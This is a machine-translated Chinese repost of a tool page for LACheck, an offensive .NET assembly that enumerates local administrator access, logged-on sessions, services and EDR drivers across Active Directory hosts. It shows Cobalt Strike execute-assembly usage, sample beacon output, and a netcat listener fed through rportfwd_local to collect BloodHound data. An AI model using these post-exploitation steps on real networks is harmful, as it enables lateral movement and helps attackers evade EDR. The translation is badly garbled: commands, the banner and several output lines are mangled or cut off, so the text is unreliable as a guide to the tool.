# LACheck:多线程 C#。NET 程序集本地管理权限枚举

> 原文：<https://kalilinuxtutorials.com/lacheck/>

[![](img/2abcfaf985e12149cc24b6a00a03e5a5.png)](https://blogger.googleusercontent.com/img/a/AVvXsEjalZ8_vZ9Ppl-yOuXQ5t0QugHFJwiq30e0Ix8QIdoeHWIpDaR-clHr6UErPRn9bN59Q0ou9B7ugOXWCPSZsq0Uenzy7vY0bt_XshSjimPIcQF2k_M5KoV7HkMAgzPO7FmH-87DSQWjwxaDA6KvPlMkmHVGnUdu_FP-x7By3JUUkN6IATd6kkNyy82v=s760)

**LACheck** 是一个多线程 C#。NET 程序集本地管理权限枚举。

**自变量**

**。/la check . exe help _*_ _ | |/\/| | |
| |/\ | | | _*_*| |
|//\ \ | | | ' _ \/_ \/_ \/|/|/|/| |/\ | | | |/(|<|/*/_ \ _**|*|*| | ^ _ ^ _ ^ _ ^ _ ^ _ \\
用法:
LACheck.exe SMB rpc/targets:hostname，fqdn.domain.tld，10 . 10 . 10 . 10/LDAP:all/OU:" OU =特殊服务器，DC =示例，DC =本地"/verbose/blood hound/user:bob @ contoso . lab
本地管理检查:
SMB–尝试访问 C＄共享
RPC–尝试通过 RPC 对 Win32_ComputerSystem 类提供程序进行 WMI 查询
WinRM–尝试对 Win32 _ 进行 WMI 查询 查询(如果未在加入域的主机上运行)
/domain–指定域名(如果未在加入域的主机上运行)
/edr–检查主机的 edr(需要 smb、rpc 或 winrm)
/logons–返回主机上已登录的用户(需要 smb、rpc 或 winrm)
/registry–枚举注册表配置单元中的会话(需要 smb)
/services–返回以用户身份运行的服务(需要 SMB、rpc、 或 winrm)
/socket–将 bloodhound 输出发送到 TCP 套接字，而不是写入磁盘
例如:" 127 . 0 . 0 . 1:8080"
/targets–要检查的主机名的逗号分隔列表
/threads–指定并行线程的最大数量(默认值= 25)
/user–指定运行收集的用户名(在令牌操作期间有用)
/validate–在扫描目标之前根据域检查凭据(在令牌操作期间有用)
/verbose–打印附加日志记录信息
/OU–指定 LDAP OU 以从
中查询已启用的计算机对象，例如:" OU =特殊服务器，DC =示例，DC =本地"
/LDAP–从以下 LDAP 过滤器中查询主机:
:All–所有启用了“主”组“域计算机”的计算机
:DC–所有启用了域控制器(非只读 DC)
:exclude-DC–所有启用了域控制器或只读 DC 之外的计算机** 

**执行组装**

**execute-assembly/opt/sharp tools/la check SMB RPC winrm/LDAP:servers-exclude-DC/targets:web 01，DEV02.contoso.com，10 . 10 . 10 . 10 . 10/logons/threads:10/verbose**

**输出**

要运行的任务信标。NET 程序:la check SMB RPC winrm/LDAP:servers-exclude-DC/targets:web 01，DEV02.contoso.com，10 . 10 . 10 . 10/logons/threads:10/verbose
[+]主机调用 home， 发送:111705 字节
[+]接收输出
[+]解析参数:
RPC:True
SMB:True
winrm:True
/blood hound:False
/edr:False
/logons:True
/registry:False
/services:False
/LDAP:servers-exclude-DC
/ou:
/targets:
/threads:10【10 这可能需要一些时间，具体取决于环境的大小
[+] LDAP 搜索结果:2
[SMB]管理成功:web 01 as svcadmin
[会话]web 01–contoso \ dev Admin(svcadmin)
[会话]web 01–contoso \ dev user(svcadmin)
[会话]web 01–contoso \ web 01 $(svcadmin)
[会话]web 01–contoso \ dev Admin(svcadmin web 01–contoso \ dev user 4/20/2021 1:40:52PM(svcadmin)
[会话]web 01–contoso \ web 01 $ 4/20/2021 5:51:43PM(svcadmin)
[会话]web 01–contoso \ dev Admin 4/20/2021 09:54:38AM(svcadmin)
[会话]web 01–contoso \ dev ]DEV02.contoso.com 上的 RPC 拒绝访问。
【！]DEV02.contoso.com 的 SMB–试图执行未经授权的操作。
【RPC】Admin 成功:10.10.10.10 as svcadmin
【！]SMB on 10 . 10 . 10 . 10–试图执行未经授权的操作。
【！]WinRM on 10 . 10 . 10 . 10–WinRM 客户端无法处理该请求。在以下情况下，可以对 IP 地址使用默认身份验证:传输是 HTTPS 或目标在 TrustedHosts 列表中，并且提供了显式凭据。使用 winrm.cmd 配置 TrustedHosts。请注意，TrustedHosts 列表中的计算机可能没有经过身份验证。有关如何设置 TrustedHosts 的详细信息，请运行以下命令:winrm help config。

**WinRM 认证**

如以上示例输出所示，由于 WinRM 客户端未尝试通过 IP 地址向主机进行身份验证，因此尝试在 IP 地址为`**10.10.10.10**`的主机上检查 WinRM 将会出错。

尝试检查 WinRM 访问时使用主机名。

**指定目标**

`**/targets**`、`**/ldap**`和`**/ou**`标志可以一起使用，也可以单独使用，以生成要枚举的主机列表。

在枚举开始之前，从这些标志返回的所有主机将被合并并进行重复数据消除。

**警犬**

LACheck 支持将 AdminTo 和 Session 收集到 json 输出中，然后上传到 BloodHound

此输出仅用于使用单个用户的更新管理权限和从已识别管理权限的主机收集的会话来扩充现有 BloodHound 集合

开关会将一个随机命名的加密 zip 文件写入磁盘，该文件可以下载、解压缩并上传到 BloodHound

**/用户**

BloodHound 要求将用户和计算机解析为 sid。由于模仿技术，如 Cobalt Strike 的`**make_token**`和`**kerberos_ticket_use**`，LACheck 可能无法准确地确定集合的用户上下文。`**/user**`参数需要向 LACheck 提供运行它的上下文的用户主体名称(format = `**samaccountname@domain.tld**`)，以便准确地关联集合信息。

**/插座**

BloodHound 的输出可以发送到 TCP 套接字，而不是写入磁盘。

如果 TCP 连接失败，BloodHound 输出将被写入磁盘。

在 Cobalt Strike 信标中，可以使用`**rportfwd_local**`将 TCP 连接从主机转发回操作员的本地机器:

**rportfwd _ local 8888 127 . 0 . 0 . 1 8888**

然后，操作员可以使用 netcat 将 TCP 流的输出通过管道传输到本地文件:

**NC-lvnp 8888>computers . JSON**

**枚举方法**

**业绩总结**

|  | 服务器信息块 | WMI | WinRM |
| --- | --- | --- | --- |
| /edr | 快的 | 快的 | 快的 |
| /登录 | 快的 | 快的 | 快的 |
| /服务 | 慢的 | 快的 | 快的 |
| /注册表 | 慢的 | 快的 | – |

–=未实施

**中小企业**

/edr

灵感来源于 harleyQu1nn 的 EDR.cna 剧本

目录。GetFiles 方法从以下位置返回驱动程序列表:

*   \ \ host \ C $ \ windows \ system32 \ drivers
*   \ \ host \ C $ \ windows \ sysnative \ drivers

根据 EDR 供应商使用的已知驱动程序列表来查找驱动程序。

**示例输出作为 svcadmin 用户运行**

**【EDR】web 01–发现:CrowdStrike，sentinel one(svcadmin)
【EDR】dev 02–未发现 EDR(svcadmin)**

**/登录次数**

NetWkstaUserEnum 返回交互式、服务和批量登录的用户列表

WTSEnumerateSessionsA 返回主机上的 RDP 会话列表

WTSQuerySessionInformationA 检索每个 RDP 会话的详细信息

**示例输出作为 svcadmin 用户运行**

**【会话】web 01–contoso \ dev admin(svcadmin)
【会话】web 01–contoso \ dev user(svcadmin)
【会话】web 01–contoso \ web 01 $(svcadmin)
【会话】web 01–contoso \ dev admin(svcadmin)
【会话】web 01–contoso \ dev user(svcadmin)
【RDP】web 01–contoso \ dev admin RDP-TCP**

**/注册表**

遍历`**\\Computer\HKEY_USERS\**`配置单元中的 SID，尝试访问每个 SID 的`**Volatile Environment**`，并从`**USERDOMAIN**`和`**USERNAME**`键中检索值。

此方法要求远程注册表服务在远程主机上运行。如果不是:

1.  记录远程注册表服务的初始启动类型
2.  开始类型更改为`**Automatic**`
3.  远程注册表服务已启动
4.  枚举注册表配置单元
5.  远程注册表服务已停止
6.  开始类型被还原为其最初记录的值

由于枚举每个主机可能需要多个步骤，因此与其他技术相比，这种方法可能会比较慢。`**smb /logons**`更快

**示例输出作为 svcadmin 用户运行**

**【注册表】web 01–contoso \ dev admini**n(svcadmin)

**/服务**

ServiceController。GetServices 方法检索主机上的服务列表

查询每个服务以确定它被配置为作为哪个用户运行。

由于必须单独查询每个服务，与其他技术相比，这种方法可能较慢。`**wmi /services**`更快

**示例输出运行为 svcadmin 使用** r

**【服务】web 01–devadmin@consoso.com 服务:secretsvc 状态:正在运行(svcadmin)**

**WMI**

/edr

灵感来源于 harleyQu1nn 的 EDR.cna 剧本

CIM_DataFile 类别从以下位置返回驱动程序列表:

*   \ host \ C $ \ windows \ system32 \ drivers
*   \ host \ C $ \ windows \ sysnative \ drivers

根据 EDR 供应商使用的已知驱动程序列表来查找驱动程序。

**示例输出作为 svcadmin 用户运行**

**【EDR】web 01–发现:CrowdStrike，sentinel one(svcadmin)
【EDR】dev 02–未发现 EDR(svcadmin)**

**/登录次数**

Win32_LoggedOnUser 类别返回已登录会话的列表 Win32_LogonSession 类别返回每个会话的详细信息

**示例输出作为 svcadmin 用户运行**

**【会话】web 01–contoso \ dev admin 4/20/2021 上午 11:00:05(svcadmin)
【会话】web 01–contoso \ dev user 4/20/2021 下午 1:40:52(svcadmin)
【会话】web 01–contoso \ web 01＄4/20/2021 下午 5:51:43(svcadmin)
【会话】web 01–contocadmin**

**/注册表**

查询 Win32_UserProfile 类别以检索系统上用户配置文件的 sid。

StdRegProv 类的 EnumKey 方法检索`**\\Computer\HKEY_USERS\**`配置单元，并尝试为每个返回的 SID 访问`**Volatile Environment**`，以从`**USERDOMAIN**`和`**USERNAM**E`键中检索值。

**示例输出作为 svcadmin 用户运行**

**【注册表】web 01–contoso \ dev admin(svcadmin)**

**/服务**

查询 Win32_Service 类别以检索服务的名称、用户和状态

**示例输出作为 svcadmin 用户运行**

**【服务】web 01–devadmin@consoso.com 服务:secretsvc 状态:正在运行(svcadmin)**

[**Download**](https://github.com/mitchmoser/LACheck)